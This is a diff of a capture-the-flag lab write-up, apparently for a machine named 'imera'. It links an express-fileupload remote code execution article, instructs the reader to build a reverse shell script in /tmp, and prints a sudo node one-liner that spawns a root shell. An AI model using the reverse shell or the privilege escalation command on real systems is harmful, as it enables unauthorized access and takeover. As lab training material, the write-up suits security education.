@@ -102,16 +102,12 @@ cat package.json
 
 This article helps top explain the node express fileupload vuln: https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325
 
-
-
-
 ---
 ## User
 
+Change to the /tmp directory and make a reverse shell as per the article before. 
 
-
-
-reverse shell
+nano rev.py
 
 ```
 ### imports
@@ -130,4 +126,21 @@ print("Finished!")
 
 ```
 
+![image](https://user-images.githubusercontent.com/5285547/129087625-827dd813-5488-4481-9600-0c0f9db3f8df.png)
 
+Now we are imera and can get the user flag. 
+
+![image](https://user-images.githubusercontent.com/5285547/129087862-95ebfe9a-7cd0-40ff-a385-48a67148b438.png)
+
+
+## Root
+
+Checking gtfo bins fdor node, I tested this payload to get root instantly. 
+
+![image](https://user-images.githubusercontent.com/5285547/129088353-2c4463c3-4af8-4d96-8d31-dab3899245e0.png)
+
+```
+sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+```
+
+![image](https://user-images.githubusercontent.com/5285547/129088291-8dc411eb-f403-43e1-8941-d308a0008c2d.png)
